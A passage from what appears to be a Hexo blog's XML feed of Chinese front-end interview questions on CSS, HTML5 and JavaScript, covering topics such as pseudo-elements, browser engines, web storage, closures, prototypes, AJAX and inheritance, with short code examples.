选择器作为其关键选择器，则不要为规则增加标签。过滤掉无关的规则（这样样式系统就不会浪费时间去匹配它们了）；提取项目的通用公有样式，增强可复用性，按模块编写组件；增强项目的协同开发性、可维护性和可扩展性;使用预处理工具或构建工具（gulp对css进行语法检查、自动补前缀、打包压缩、自动优雅降级）； 浏览器是怎样解析CSS选择器的？样式系统从关键选择器开始匹配，然后左移查找规则选择器的祖先元素。只要选择器的子树一直在工作，样式系统就会持续左移，直到和规则匹配，或者是因为不匹配而放弃该规则。 margin和padding分别适合什么场景使用？margin是用来隔开元素与元素的间距；padding是用来隔开元素与内容的间隔。margin用于布局分开元素使元素与元素互不相干；padding用于元素与内容之间的间隔，让内容（文字）与（包裹）元素之间有一段 ::before 和 :after中双冒号和单冒号 有什么区别？解释一下这2个伪元素的作用。单冒号(:)用于CSS3伪类，双冒号(::)用于CSS3伪元素。（伪元素由双冒号和伪元素名称组成）双冒号是在当前规范中引入的，用于区分伪类和伪元素。不过浏览器需要同时支持旧的已经存在的伪元素写法，比如:first-line、:first-letter、:before、:after等，而新的在CSS3中引入的伪元素则不允许再支持旧的单冒号的写法。想让插入的内容出现在其它内容前，使用::before，否者，使用::after；在代码顺序上，::after生成的内容也比::before生成的内容靠后。如果按堆栈视角，::after生成的内容会在::before生成的内容之上 如何修改chrome记住密码后自动填充表单的黄色背景 ？12345input:-webkit-autofill, textarea:-webkit-autofill, select:-webkit-autofill &#123; background-color: rgb(250, 255, 189); /* #FAFFBD; */ background-image: none; color: rgb(0, 0, 0);&#125; 设置元素浮动后，该元素的display值是多少？自动变成了 display:block 怎么让Chrome支持小于12px 的文字？ 1、用图片：如果是内容固定不变情况下，使用将小于12px文字内容切出做图片，这样不影响兼容也不影响美观。 2、使用12px及12px以上字体大小：为了兼容各大主流浏览器，建议设计美工图时候设置大于或等于12px的字体大小，如果是接单的这个时候就需要给客户讲解小于12px浏览器不兼容等事宜。 3、继续使用小于12px字体大小样式设置：如果不考虑chrome可以不用考虑兼容，同时在设置小于12px对象设置-webkit-text-size-adjust:none，做到最大兼容考虑。 4、使用12px以上字体：为了兼容、为了代码更简单 从新考虑权重下兼容性。 让页面里的字体变清晰，变细用CSS怎么做？-webkit-font-smoothing: antialiased; position:fixed;在android下无效怎么处理？fixed的元素是相对整个页面固定位置的，你在屏幕上滑动只是在移动这个所谓的viewport，原来的网页还好好的在那，fixed的内容也没有变过位置，所以说并不是iOS不支持fixed，只是fixed的元素不是相对手机屏幕固定的。 1&lt;meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no"/&gt; 如果需要手动写动画，你认为最小时间间隔是多久，为什么？（阿里）多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60＊1000ms ＝ 16.7ms display:inline-block 什么时候会显示间隙？(携程)移除空格、使用margin负值、使用font-size:0、letter-spacing、word-spacing 什么是Cookie 隔离？（或者说：请求资源的时候不要让它带cookie怎么做）如果静态文件都放在主域名下，那静态文件请求的时候都带有的cookie的数据提交给server的，非常浪费流量，所以不如隔离开。 因为cookie有域的限制，因此不能跨域提交请求，故使用非主要域名的时候，请求头中就不会带有cookie数据，这样可以降低请求头的大小，降低请求时间，从而达到降低整体请求延时的目的。 同时这种方式不会将cookie传入Web Server，也减少了Web Server对cookie的处理分析环节，提高了webserver的http请求的解析速度。 什么是CSS 预处理器 / 后处理器？ 预处理器例如：LESS、Sass、Stylus，用来预编译Sass或less，增强了css代码的复用性，还有层级、mixin、变量、循环、函数等，具有很方便的UI组件模块化开发能力，极大的提高工作效率。 后处理器例如：PostCSS，通常被视为在完成的样式表中根据CSS规范处理CSS，让其更有效；目前最常做的是给CSS属性添加浏览器私有前缀，实现跨浏览器兼容性的问题。]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>CSS专题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-HTML专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-HTML%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"><![CDATA[常用哪几种浏览器测试？有哪些内核(Layout Engine)? 浏览器：IE,Chrome,FireFox,Safari,Opera 内核：Trident,Gecko,Presto,Webkit。 详细介绍 Trident内核代表产品Internet Explorer，又称其为IE内核。Trident（又称为MSHTML），是微软开发的一种排版引擎。使用Trident渲染引擎的浏览器包括：IE、傲游、世界之窗浏览器、Avant、腾讯TT、Netscape 8、NetCaptor、Sleipnir、GOSURF、GreenBrowser和KKman等。 Gecko内核代表作品Mozilla FirefoxGecko是一套开放源代码的、以C++编写的网页排版引擎。Gecko是最流行的排版引擎之一，仅次于Trident。使用它的最著名浏览器有Firefox、Netscape6至9。 WebKit内核代表作品Safari、Chromewebkit 是一个开源项目，包含了来自KDE项目和苹果公司的一些组件，主要用于Mac OS系统，它的特点在于源码结构清晰、渲染速度极快。缺点是对网页代码的兼容性不高，导致一些编写不标准的网页无法正常显示。主要代表作品有Safari和Google的浏览器Chrome。 Presto内核代表作品OperaPresto是由Opera Software开发的浏览器排版引擎，供Opera 7.0及以上使用。它取代了旧版Opera 4至6版本使用的Elektra排版引擎，包括加入动态功能，例如网页或其部分可随着DOM及Script语法的事件而重新排版。 说下行内元素和块级元素的区别？行内块元素的兼容性使用？(IE8 以下) 行内元素：会在水平方向排列，不能包含块级元素，设置width无效，height无效(可以设置line-height)，margin上下无效，左右有效，padding上下左右都有效。 块级元素：各占据一行，垂直方向排列。 兼容性： display:inline-block display:inline; zoom:1;说说对zoom：1的理解？zoom:1;属性是IE浏览器的专有属性，Firefox等其它浏览器不支持。它可以设置或检索对象的缩放比例。除此之外，它还有其他一些小作用，比如触发ie的hasLayout属性，清除浮动、清除margin的重叠等。但很遗憾的是，它通不过W3C验证．说说对IE的haslayout的理解？haslayout是Windows Internet Explorer渲染引擎的一个内部组成部分。在Internet Explorer中，使用布局概念来控制元素的尺寸和定位。在理想情况下，所有元素都控制自己的尺寸和定位。但是，这在IE中会导致很大的性能问题。因此，IE开发团队决定只将布局应用于实际需要它的那些元素，这样就可以充分地减少性能开销。具体什么是haslayout请看这篇文章 ： http://www.cnblogs.com/yuqingfamily/p/6866285.html Doctype作用？标准模式与兼容模式各有什么区别? &lt;!DOCTYPE&gt;告知浏览器的解析器用什么文档标准解析这个文档。DOCTYPE不存在或格式不正确会导致文档以兼容模式呈现。 标准模式的排版和JS运作模式都是以该浏览器支持的最高标准运行。在兼容模式中，页面以宽松的向后兼容的方式显示,模拟老式浏览器的行为以防止站点无法工作。HTML5 为什么只需要写 &lt;!DOCTYPE HTML&gt;？ HTML5不基于 SGML，因此不需要对DTD进行引用，但是需要doctype来规范浏览器的行为（让浏览器按照它们应该的方式来运行）。 而HTML4.01基于SGML,所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型。 行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？首先：CSS规范规定，每个元素都有display属性，确定该元素的类型，每个元素都有默认的display值，如div的display默认值为“block”，则为“块级”元素；span默认display属性值为“inline”，是“行内”元素。 （1）行内元素有：a b span img input select strong（强调的语气） （2）块级元素有：div ul ol li dl dt dd h1 h2 h3 h4…p （3）常见的空元素： 鲜为人知的是： 不同浏览器（版本）、HTML4（5）、CSS2等实际略有差异参考: http://stackoverflow.com/questions/6867254/browsers-default-css-for-html-elements html5有哪些新特性？如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？ 新特性：HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加。 (1)绘画 canvas; (2)用于媒介回放的 video 和 audio 元素; (3)本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失; (4)sessionStorage 的数据在浏览器关闭后自动删除; (5)语意化更好的内容元素，比如 article、footer、header、nav、section; (6)表单控件，calendar、date、time、email、url、search; (7)新的技术webworker, websocket, Geolocation; 如何处理浏览器兼容问题？ IE8/IE7/IE6支持通过document.createElement方法产生的标签，可以利用这一特性让这些浏览器支持HTML5新标签，浏览器支持新标签后，还需要添加标签默认的样式。当然也可以直接使用成熟的框架、比如html5shim;&lt;!–[if lt IE 9]&gt; src=”http://html5shim.googlecode.com/svn/trunk/html5.js&quot;&lt;![endif]–&gt; 如何区分 HTML 和 HTML5？ 文档声明，语意结构，H5新标签的使用 简述一下你对HTML语义化的理解？ 用正确的标签做正确的事情。 html语义化让页面的内容结构化，结构更清晰，便于对浏览器、搜索引擎解析; 即使在没有样式CSS情况下也以一种文档格式显示，并且是容易阅读的; 搜索引擎的爬虫也依赖于HTML标记来确定上下文和各个关键字的权重，利于SEO; 使阅读源代码的人对网站更容易将网站分块，便于阅读维护理解。 HTML5的离线储存怎么使用，工作原理能不能解释一下？在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件。 原理：HTML5的离线存储是基于一个新建的.appcache文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像cookie一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示。 如何使用： 1、页面头部像下面一样加入一个manifest的属性； 2、在cache.manifest文件的编写离线存储的资源； CACHE MANIFEST #v0.11 CACHE: js/app.js css/style.css NETWORK: resourse/logo.png FALLBACK: / /offline.html 3、在离线状态时，操作window.applicationCache进行需求实现。 浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢？在线的情况下，浏览器发现html头部有manifest属性，它会请求manifest文件，如果是第一次访问app，那么浏览器就会根据manifest文件的内容下载相应的资源并且进行离线存储。如果已经访问过app并且资源已经离线存储了，那么浏览器就会使用离线的资源加载页面，然后浏览器会对比新的manifest文件与旧的manifest文件，如果文件没有发生改变，就不做任何操作，如果文件改变了，那么就会重新下载文件中的资源并进行离线存储。离线的情况下，浏览器就直接使用离线存储的资源。 请描述一下 cookies，sessionStorage 和 localStorage 的区别？ cookie是网站为了标示用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。 cookie数据始终在同源的http请求中携带（即使不需要），也会在浏览器和服务器间来回传递。 sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。 存储大小： cookie数据大小不能超过4k。 sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。 有期时间： localStorage 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据； sessionStorage 数据在当前浏览器窗口关闭后自动删除。 cookie 设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭 iframe有那些缺点？ iframe会阻塞主页面的Onload事件； 搜索引擎的检索程序无法解读这种页面，不利于SEO; iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载。 使用iframe之前需要考虑这两个缺点。如果需要使用iframe，最好是通过javascript动态给iframe添加src属性值，这样可以绕开以上两个问题。 如何实现浏览器内多个标签页之间的通信?(阿里)WebSocket、SharedWorker也可以调用localstorge、cookies等本地存储方式。localstorge另一个浏览上下文里被添加、修改或删除时，它都会触发一个事件，我们通过监听事件，控制它的值来进行页面信息通信。 注意quirks：Safari 在无痕模式下设置localstorge值时会抛出 QuotaExceededError 的异常。 如何在页面上实现一个圆形的可点击区域？-（1）map+area或者svg-（2）border-radius-（3）纯js实现 需要求一个点在不在圆上简单算法、获取鼠标坐标等等 Label的作用是什么？是怎么用的？label标签来定义表单控制间的关系,当用户选择该标签时，浏览器会自动将焦点转到和标签相关的表单控件上。 123&lt;label for="Name"&gt;Number:&lt;/label&gt;&lt;input type=“text“name="Name" id="Name"/&gt;&lt;label&gt;Date:&lt;input type="text" name="B"/&gt;&lt;/label&gt; HTML5的form如何关闭自动完成功能？给不想要提示的 form 或某个 input 设置为 autocomplete=off。 webSocket如何兼容低浏览器？(阿里) Adobe Flash Socket 、 ActiveX HTMLFile (IE) 、 基于 multipart 编码发送 XHR 、 基于长轮询的 XHR 页面可见性（Page Visibility API） 可以有哪些用途？通过 visibilityState 的值检测页面当前是否可见，以及打开网页的时间等;在页面被切换到其他后台进程的时候，自动暂停音乐或视频的播放； 如何在页面上实现一个圆形的可点击区域？ 1、map+area或者svg 2、border-radius 3、纯js实现 需要求一个点在不在圆上简单算法、获取鼠标坐标等等 实现不使用 border 画出1px高的线，在不同浏览器的标准模式与怪异模式下都能保持一致的效果。1&lt;div style="height:1px;overflow:hidden;background:red"&gt;&lt;/div&gt; 网页验证码是干嘛的，是为了解决什么安全问题。区分用户是计算机还是人的公共全自动程序。可以防止恶意破解密码、刷票、论坛灌水；有效防止黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试。 title与h1的区别、b与strong的区别、i与em的区别？title属性没有明确意义只表示是个标题，H1则表示层次明确的标题，对页面信息的抓取也有很大的影响；strong是标明重点内容，有语气加强的含义，使用阅读设备阅读网络时：会重读，而是展示强调内容。i内容展示为斜体，em表示强调的文本；Physical Style Elements – 自然样式标签b, i, u, s, preSemantic Style Elements – 语义样式标签strong, em, ins, del, code应该准确使用语义样式标签, 但不能滥用, 如果不能确定时首选使用自然样式标签。 ##]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>HTML专题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题-JavaScript专题]]></title>
    <url>%2F2018%2F08%2F30%2F%E9%9D%A2%E8%AF%95%E9%A2%98-JavaScript%E4%B8%93%E9%A2%98%2F</url>
    <content type="text"><![CDATA[介绍js的基本数据类型undefined、null、boolean、number、string js有哪些内置对象？ 数据封装类对象：Object、Array、Boolean、Number 和 String 其他对象：Function、Arguments、Math、Date、RegExp、Error this对象的理解 this总是指向函数的直接调用者（而非间接调用者）； 如果有new关键字，this指向new出来的那个对象； 在事件中，this指向触发这个事件的对象，特殊的是，IE中的attachEvent中的this总是指向全局对象Window； eval是做什么的？它的功能是把对应的字符串解析成JS代码并运行；应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行）。由JSON字符串转换为JSON对象的时候可以用eval，var obj =eval(‘(‘+ str +’)’);DOM怎样添加、移除、移动、复制、创建和查找节点 12345678910111213// 创建新节点createDocumentFragment() //创建一个DOM片段createElement() //创建一个具体的元素createTextNode() //创建一个文本节点// 添加、移除、替换、插入appendChild()removeChild()replaceChild()insertBefore() //在已有的子节点前插入一个新的子节点// 查找getElementsByTagName() //通过标签名称getElementsByName() //通过元素的Name属性的值(IE容错能力较强，会得到一个数组，其中包括id等于name值的)getElementById() //通过元素Id，唯一性 null和undefined的区别？ null 表示一个对象是“没有值”的值，也就是值为“空”； undefined 表示一个变量声明了没有初始化(赋值)； undefined不是一个有效的JSON，而null是； undefined的类型(typeof)是undefined； null的类型(typeof)是object； Javascript将未赋值的变量默认值设为undefined；Javascript从来不会将变量设为null。它是用来让程序员表明某个用var声明的变量时没有值的。 typeof undefined //“undefined” undefined :是一个表示”无”的原始值或者说表示”缺少值”，就是此处应该有一个值，但是还没有定义。当尝试读取时会返回 undefined； 例如变量被声明了，但没有赋值时，就等于undefined typeof null //“object” null : 是一个对象(空对象, 没有任何属性和方法)； 例如作为函数的参数，表示该函数的参数不是对象； 注意： 在验证null时，一定要使用 === ，因为 == 无法分别 null 和 undefined null == undefined // true null === undefined // false null是一个表示”无”的对象，转为数值时为0；undefined是一个表示”无”的原始值，转为数值时为NaN。 undefined： （1）变量被声明了，但没有赋值时，就等于undefined。 （2) 调用函数时，应该提供的参数没有提供，该参数等于undefined。 （3）对象没有赋值的属性，该属性的值为undefined。 （4）函数没有返回值时，默认返回undefined。 null： （1） 作为函数的参数，表示该函数的参数不是对象。 （2） 作为对象原型链的终点。 具体差别可查看这篇文章：http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html new操作符具体干了什么呢?-（1）创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型。-（2）属性和方法被加入到 this 引用的对象中。-（3）新创建的对象由 this 所引用，并且最后隐式的返回 this 。 JSON 的了解？JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。它是基于JavaScript的一个子集。数据格式简单, 易于读写, 占用带宽小。格式：采用键值对，例如：{‘age’:’12’, ‘name’:’back’} call() 和 apply() 的区别和作用？apply()函数有两个参数：第一个参数是上下文，第二个参数是参数组成的数组。如果上下文是null，则使用全局对象代替。如：function.apply(this,[1,2,3]);call()的第一个参数是上下文，后续是实例传入的参数序列。如：function.call(this,1,2,3); 如何获取UA（用户代理）？123456function whatBrowser() &#123; document.Browser.Name.value=navigator.appName; document.Browser.Version.value=navigator.appVersion; document.Browser.Code.value=navigator.appCodeName; document.Browser.Agent.value=navigator.userAgent; &#125; navigator.userAgent 获取浏览器UA 说几条写JavaScript的基本规范？ 1.不要在同一行声明多个变量。 2.请使用 ===/!==来比较true/false或者数值 3.使用对象字面量替代new Array这种形式 4.不要使用全局函数。 5.Switch语句必须带有default分支 6.函数不应该有时候有返回值，有时候没有返回值。 7.For循环必须使用大括号 8.If语句必须使用大括号 9.for-in循环中的变量 应该使用var关键字明确限定作用域，从而避免作用域污染。 JavaScript原型，原型链 ? 有什么特点？ （1）原型对象也是普通的对象，是对象一个自带隐式的 proto 属性，原型也有可能有自己的原型，如果一个原型对象的原型不为null的话，我们就称之为原型链。 （2）原型链是由一些用来继承和共享属性的对象组成的（有限的）对象链。 每个对象都会在其内部初始化一个属性，就是prototype(原型)，当我们访问一个对象的属性时，如果这个对象内部不存在这个属性，那么他就会去prototype里找这个属性，这个prototype又会有自己的prototype，于是就这样一直找下去，也就是我们平时所说的原型链的概念。关系：instance.constructor.prototype = instance.proto 特点：JavaScript对象是通过引用来传递的，我们创建的每个新对象实体中并没有一份属于自己的原型副本。当我们修改原型时，与之相关的对象也会继承这一改变。 当我们需要一个属性的时，Javascript引擎会先看当前对象中是否有这个属性， 如果没有的话，就会查找他的Prototype对象是否有这个属性，如此递推下去，一直检索到 Object 内建对象。 12345678910function Func()&#123;&#125; Func.prototype.name = "Sean"; Func.prototype.getInfo = function() &#123; return this.name;&#125;var person = new Func();//现在可以参考var person = Object.create(oldObject);console.log(person.getInfo());//它拥有了Func的属性和方法//"Sean"console.log(Func.prototype);// Func &#123; name="Sean", getInfo=function()&#125; JavaScript有几种类型的值？，你能画一下他们的内存图吗？ 栈：原始数据类型（Undefined，Null，Boolean，Number、String） 堆：引用数据类型（对象、数组和函数） 两种类型的区别是：存储位置不同； 原始数据类型直接存储在栈(stack)中的简单数据段，占据空间小、大小固定，属于被频繁使用数据，所以放入栈中存储； 引用数据类型存储在堆(heap)中的对象,占据空间大、大小不固定。如果存储在栈中，将会影响程序运行的性能；引用数据类型在栈中存储了指针，该指针指向堆中该实体的起始地址。当解释器寻找引用值时，会首先检索其在栈中的地址，取得地址后从堆中获得实体 Flash、Ajax各自的优缺点，在使用中如何取舍？Flash适合处理多媒体、矢量图形、访问机器；对CSS、处理文本上不足，不容易被搜索。Ajax对CSS、文本支持很好，支持搜索；多媒体、矢量图形、机器访问不足。共同点：与服务器的无刷新传递消息、用户离线和在线状态、操作DOM 什么是闭包？为什么要用它？闭包的理解闭包，官方对闭包的解释是：一个拥有许多变量和绑定了这些变量的环境的表达式（通常是一个函数），因而这些变量也是该表达式的一部分。 闭包的特点： （1）作为一个函数变量的一个引用，当函数返回时，其处于激活状态。 （2） 一个闭包就是当一个函数返回时，一个没有释放资源的栈区。 闭包的特性： 1.函数内再嵌套函数 2.内部函数可以引用外层的参数和变量 3.参数和变量不会被垃圾回收机制回收 简单的说，Javascript允许使用内部函数—即函数定义和函数表达式位于另一个函数的函数体内。而且，这些内部函数可以访问它们所在的外部函数中声明的所有局部变量、参数和声明的其他内部函数。当其中一个这样的内部函数在包含它们的外部函数之外被调用时，就会形成闭包。 为什么要用闭包？1234567891011121314151617//li节点的onclick事件都能正确的弹出当前被点击的li索引 &lt;ul id="testUL"&gt; &lt;li&gt; index = 0&lt;/li&gt; &lt;li&gt; index = 1&lt;/li&gt; &lt;li&gt; index = 2&lt;/li&gt; &lt;li&gt; index = 3&lt;/li&gt; &lt;/ul&gt; &lt;script type="text/javascript"&gt; var nodes = document.getElementsByTagName("li"); for(i = 0;i&lt;nodes.length;i+= 1)&#123; nodes[i].onclick = (function(i)&#123; return function() &#123; console.log(i); &#125; //不用闭包的话，值每次都是4 &#125;)(i); &#125; &lt;/script&gt; 执行say667()后,say667()闭包内部变量会存在,而闭包内部函数的内部变量不会存在使得Javascript的垃圾回收机制GC不会收回say667()所占用的资源因为say667()的内部函数的执行需要依赖say667()中的变量这是对闭包作用的非常直白的描述 123456789101112function say667() &#123; // Local variable that ends up within closure var num = 666; var sayAlert = function() &#123; alert(num); &#125; num++; return sayAlert; &#125;var sayAlert = say667();sayAlert()//执行结果应该弹出的667 javascript 代码中的”use strict”;是什么意思 ? 使用它区别是什么？ use strict是一种ECMAscript 5 添加的（严格）运行模式,这种模式使得 Javascript 在更严格的条件下运行, 使JS编码更加规范化的模式,消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为。 默认支持的糟糕特性都会被禁用，比如不能用with，也不能在意外的情况下给全局变量赋值; 全局变量的显示声明,函数必须声明在顶层，不允许在非函数代码块内声明函数,arguments.callee也不允许使用； 消除代码运行的一些不安全之处，保证代码运行的安全,限制函数中的arguments修改，严格模式下的eval函数的行为和非严格模式的也不相同; 提高编译器效率，增加运行速度； 为未来新版本的Javascript标准化做铺垫。 Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？hasOwnProperty javaScript中hasOwnProperty函数方法是返回一个布尔值，指出一个对象是否具有指定名称的属性。此方法无法检查该对象的原型链中是否具有该属性；该属性必须是对象本身的一个成员。 使用方法：object.hasOwnProperty(proName)其中参数object是必选项。一个对象的实例。proName是必选项。一个属性名称的字符串值。 如果 object 具有指定名称的属性，那么JavaScript中hasOwnProperty函数方法返回 true，反之则返回 false。 js延迟加载的方式有哪些？defer和async、动态创建DOM方式（用得最多）、按需异步载入js javascript里面的继承怎么实现，如何避免原型链上面的对象共享用构造函数和原型链的混合模式去实现继承，避免对象共享可以参考经典的extend()函数，很多前端框架都有封装的，就是用一个空函数当做中间变量 ajax过程 (1)创建XMLHttpRequest对象,也就是创建一个异步调用对象. (2)创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息. (3)设置响应HTTP请求状态变化的函数. (4)发送HTTP请求. (5)获取异步调用返回的数据. (6)使用JavaScript和DOM实现局部刷新. Ajax 解决浏览器缓存问题？ 1、在ajax发送请求前加上 anyAjaxObj.setRequestHeader(“If-Modified-Since”,”0”)。 2、在ajax发送请求前加上 anyAjaxObj.setRequestHeader(“Cache-Control”,”no-cache”)。 3、在URL后面加上一个随机数： “fresh=” + Math.random();。 在URL后面加上时间戳：”nowtime=” + new Date().getTime();。 如果是使用jQuery，直接这样就可以了 $.ajaxSetup({cache:false})。这样页面的所有ajax都会执行这条语句就是不需要保存缓存记录。 同步和异步的区别？同步的概念应该是来自于OS中关于同步的概念:不同进程为协同完成某项工作而在先后次序上调整(通过阻塞,唤醒等方式).同步强调的是顺序性.谁先谁后.异步则不存在这种顺序性. 同步：浏览器访问服务器请求，用户看得到页面刷新，重新发请求,等请求完，页面刷新，新内容出现，用户看到新内容,进行下一步操作。 异步：浏览器访问服务器请求，用户正常操作，浏览器后端进行请求。等请求完，页面不刷新，新内容也会出现，用户看到新内容。 AMD和CMD的区别？ AMD 是 RequireJS 在推广过程中对模块定义的规范化产出。 CMD 是 SeaJS 在推广过程中对模块定义的规范化产出。 类似的还有 CommonJS Modules/2.0 规范，是 BravoJS 在推广过程中对模块定义的规范化产出。 这些规范的目的都是为了 JavaScript 的模块化开发，特别是在浏览器端的。目前这些规范的实现都能达成浏览器端模块化开发的目的。 区别： 对于依赖的模块，AMD 是提前执行，CMD 是延迟执行。不过 RequireJS 从 2.0 开始，也改成可以延迟执行（根据写法不同，处理方式不同）。CMD 推崇 as lazy as possible. CMD 推崇依赖就近，AMD 推崇依赖前置。 123456789101112131415// CMDdefine(function(require, exports, module) &#123; var a = require('./a') a.doSomething() // 此处略去 100 行 var b = require('./b') // 依赖可以就近书写 b.doSomething() // ... &#125;)// AMD 默认推荐的是define(['./a', './b'], function(a, b) &#123; // 依赖必须一开始就写好 a.doSomething()// 此处略去 100 行 b.doSomething()&#125;) ajax不可避免的问题都有什么？如何解决呢？ （Q1）ajax以何种数据格式交换数据和跨域的问题如何解决 （Q2）这两大问题，都有不同的解决方案，但是最被推崇的就是用JSON来传数据，靠JSONP来跨域 你有哪些性能优化的方法？ （1） 减少http请求次数：CSS Sprites, JS、CSS源码压缩、图片大小控制合适；网页Gzip，CDN托管，data缓存 ，图片服务器。 （2） 前端模板 JS+数据，减少由于HTML标签导致的带宽浪费，前端用变量保存AJAX请求结果，每次操作本地变量，不用请求，减少请求次数 （3） 用innerHTML代替DOM操作，减少DOM操作次数，优化javascript性能。 （4） 当需要设置的样式很多时设置className而不是直接操作style。 （5） 少用全局变量、缓存DOM节点查找的结果。减少IO读取操作。 （6） 避免使用CSS Expression（css表达式)又称Dynamic properties(动态属性)。 （7） 图片预加载，将样式表放在顶部，将脚本放在底部 加上时间戳。什么叫优雅降级和渐进增强？优雅降级：Web站点在所有新式浏览器中都能正常工作，如果用户使用的是老式浏览器，则代码会检查以确认它们是否能正常工作。由于IE独特的盒模型布局问题，针对不同版本的IE的hack实践过优雅降级了,为那些无法支持功能的浏览器增加候选方案，使之在旧式浏览器上以某种形式降级体验却不至于完全失效. 渐进增强：从被所有浏览器支持的基本功能开始，逐步地添加那些只有新式浏览器才支持的功能,向页面增加无害于基础浏览器的额外样式和功能的。当浏览器支持时，它们会自动地呈现出来并发挥作用。 哪些常见操作会造成内存泄漏？内存泄漏：指任何对象在您不再拥有或需要它之后仍然存在。 垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。 闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？ ###【http 请求阶段】； 浏览器首先会把url发送给DNS服务器；解析出一个服务器的IP地址； DNS 服务器会根据IP找到对应的服务器，（服务器需要联网） 3.服务器接收到请求；客户端和服务器已经产生了连接； 【http的响应阶段】 4.服务器接收到请求后，会根据你的传过来的地址，路径，等找到相应的项目； 5.在服务器找到之后，服务器立即把一些响应信息放在响应头中，通过http发送给客户端；同时，进行数据的整理； 6.把整理出来的数据，通过http发送给客户端；直到客户端数据接收完毕； 【浏览器渲染阶段】 7.浏览器拿到从服务器传输过来的数据文件； 8.首先会遍历HTML，形成DOM树； 9.代码从上到下解析，形成css树； 10.DOM树和cSS树，重新组合成render树； 11.浏览器进行描绘和渲染； 从浏览器发送请求开始，并通过http把数据传输给服务器，服务器通过http把数据返回给客户端，这样一个闭合的过程称为一个http事物； 框架 ：组件化开发 、虚拟DOM；操作的不是真实的DOMjquery : 真实的DOM。性能慢，比较低； 用户体验 ：http的三次握手和四次挥手：浏览器在给服务器传输数据之间，有三次握手，握成功之后，才可以传输数据； 三次握手 浏览器需要先发送SYN码，客户端请求和服务器建立连接； 服务器接收到SYN码，再发送给客户端ACK码，我可以建立连接； 客户端接收到ACK码，验证这个ACK是否正确，如果正确，则客户端和服务器就建立起数据连接；双方的数据发送通道都将开启； 四次挥手： 1.当客户端把数据都发送给服务器，没有数据再传输给服务器，那么会发送一个FIN码 2.当服务器接收客户端数据完毕之后，告诉给客户端，给客户端发送AC码，你可以把数据通道关闭； 当服务器发送完毕之后，也会发送FIN码，告诉浏览器，数据发送完毕 4.当客户端接收完毕之后，同样发送ACK码，告诉服务器，数据接收完毕，你可以进行关闭； 优点： 确保数据的安全性； 确保数据的完整性； 响应头：服务器会告诉浏览器数据的长度；浏览器接收的数据长度和响应头数据长度相同，说明数据已经接收完毕； 如何将浮点数点左边的数每三位添加一个逗号，如12000000.11转化为『12,000,000.11』?1234567 function commafy(num)&#123; return num &amp;&amp; num .toString() .replace(/(\d)(?=(\d&#123;3&#125;)+\.)/g, function($1, $2)&#123; return $2 + ','; &#125;);&#125; 如何实现数组的随机排序？1234567891011121314151617181920212223242526272829303132方法一： var arr = [1,2,3,4,5,6,7,8,9,10]; function randSort1(arr)&#123; for(var i = 0,len = arr.length;i &lt; len; i++ )&#123; var rand = parseInt(Math.random()*len); var temp = arr[rand]; arr[rand] = arr[i]; arr[i] = temp; &#125; return arr; &#125; console.log(randSort1(arr)); 方法二： var arr = [1,2,3,4,5,6,7,8,9,10]; function randSort2(arr)&#123; var mixedArray = []; while(arr.length &gt; 0)&#123; var randomIndex = parseInt(Math.random()*arr.length); mixedArray.push(arr[randomIndex]); arr.splice(randomIndex, 1); &#125; return mixedArray; &#125; console.log(randSort2(arr)); 方法三： var arr = [1,2,3,4,5,6,7,8,9,10]; arr.sort(function()&#123; return Math.random() - 0.5; &#125;) console.log(arr); Javascript如何实现继承？继承方式原型式继承核心：将父类的实例作为子类的原型。 123SubType.prototype = newSuperType() // 所有涉及到原型链继承的继承方式都要修改子类构造函数的指向，否则子类实例的构造函数会指向SuperType。SubType.prototype.constructor = SubType; 优点：父类方法可以复用。缺点： 父类的引用属性会被所有子类实例共享 子类构建实例时不能向父类传递参数 构造函数继承核心：将父类构造函数的内容复制给了子类的构造函数。这是所有继承中唯一一个不涉及到prototype的继承。 1SuperType.call(SubType); 优点：和原型链继承完全反过来 父类的引用属性不会被共享 子类构建实例时可以向父类传递参数 缺点：父类的方法不能复用，子类实例的方法每次都是单独创建的。组合继承核心：原型式继承和构造函数继承的组合，兼具了二者的优点。 12345678910111213functionSuperType() &#123; this.name = 